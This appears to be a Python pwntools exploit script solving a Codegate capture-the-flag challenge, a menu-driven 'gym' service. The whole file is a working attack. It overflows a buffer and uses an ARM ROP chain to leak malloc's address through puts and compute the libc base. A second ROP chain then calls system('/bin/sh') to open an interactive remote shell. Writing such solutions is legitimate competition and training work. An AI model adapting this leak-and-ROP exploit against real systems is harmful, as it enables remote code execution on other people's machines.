#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *

io = remote("ch41l3ng3s.codegate.kr", 1199)

# gdb
def attach(addr):
    gdb.attach(io, execute='b *0x%x' % (addr))

def check(height, weight):
    io.recvuntil('6. Out of the gym')
    io.sendline('1')
    io.recvuntil('Your height(meters) :')
    io.sendline(str(height))
    io.recvuntil('Your weight(kilograms) :')
    io.sendline(str(weight))

def exercise():
    io.recvuntil('6. Out of the gym')
    io.sendline('2')

def register(size):
    io.recvuntil('6. Out of the gym')
    io.sendline('3')
    io.recvuntil('How long do you want to take personal training?')
    io.sendline(str(size))

def write_diary(payload):
    io.recvuntil('6. Out of the gym')
    io.sendline('4')
    #raw_input()
    io.sendline(payload)

check(0.4841229182759271, 8.1)
check(0.4841229182759271, 8.1)
exercise()
register(0x1ff)

payload  = ''
payload += 'A'*0x50
payload += p32(0xcafebabe)
payload += p32(0x11bbc) # pop   {r0, pc}
payload += p32(0x23020) # got_malloc
payload += p32(0x104A8) # plt_puts
payload += p32(0xdeadbeef)*7
payload += p32(0x104fc)
payload  = payload.ljust(0xff, '\x00')

write_diary(payload)

io.recvuntil('6. Out of the gym')
io.sendline('6')

io.recvuntil("Type the number:See you again :)\n")
libc_malloc = u32(io.recv(4))
libc_base = libc_malloc-0x728E4
print 'libc_malloc %#x' % libc_malloc

check(0.4841229182759271, 8.1)
check(0.4841229182759271, 8.1)
exercise()
register(0x1ff)

payload  = ''
payload += 'A'*0x50
payload += p32(0xcafebabe)
payload += p32(0x11bbc) # pop   {r0, pc}
payload += p32(libc_base+0x12121C) # libc_bin_sh
payload += p32(libc_base+0x38634) # libc_system
payload += p32(0xdeadbeef)*7
payload += p32(0xcafebabe)
payload  = payload.ljust(0xff, '\x00')

write_diary(payload)

io.recvuntil('6. Out of the gym')
io.sendline('6')

io.interactive()

